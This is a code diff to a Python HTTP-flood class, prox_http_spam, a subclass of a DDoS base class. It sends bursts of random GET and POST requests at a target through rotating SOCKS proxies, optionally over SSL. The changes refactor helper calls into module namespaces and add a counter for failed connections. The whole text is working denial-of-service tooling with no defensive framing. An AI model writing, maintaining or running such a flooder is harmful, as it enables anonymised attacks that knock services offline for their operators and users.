@@ -28,7 +28,7 @@ class prox_http_spam(DDoS_Class):
         logs=True,
     ):
         self.ssl_on=ssl_on
-        self.proxies=get_socket_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
+        self.proxies=Proxies_Interface.get_socket_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
         self.proxies=[x for x in self.proxies if x['proxy_type'] in ['socks4','socks5','s4','s5']]
         if self.proxies==[]:
             self.proxies=[{'proxy_host':None,'proxy_port':None,'proxy_username':None,'proxy_password':None,'proxy_type':None}]
@@ -40,6 +40,7 @@ class prox_http_spam(DDoS_Class):
         self.method = method
         self.stop = False
         self.counter = 0
+        self.fails=0
         self.start = time.time()
         self.target = u
         self.duration = duration
@@ -75,7 +76,7 @@ class prox_http_spam(DDoS_Class):
                     proxy=random.choice(self.proxies)
                     s=Proxies_Getter.get_proxy_socket(self.target,self.port,timeout=self.timeout,**proxy)
                     if self.port==443 or self.ssl_on==True:
-                        s=wrap_socket_with_ssl(s,self.target)
+                        s=Socket_Connection.wrap_socket_with_ssl(s,self.target)
                     for l in range(random.randint(self.round_min, self.round_max)):
                         if self.method == 3:
                             ty = random.randint(1, 2)
@@ -85,7 +86,7 @@ class prox_http_spam(DDoS_Class):
                             req = "GET"
                         else:
                             req = "POST"
-                        m = setup_http_packet(
+                        m = Socket_Connection.setup_http_packet(
                             self.target,
                             ty,
                             self.paths,
@@ -111,11 +112,12 @@ class prox_http_spam(DDoS_Class):
                                 # print("Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
                             time.sleep(self.interval)
                         except:
+                            self.fails+=1
                             break
                         time.sleep(self.interval)
                     s.close()
                 except:
-                    pass
+                    self.fails+=1
                 time.sleep(0.1)
             self.kill()
         except:
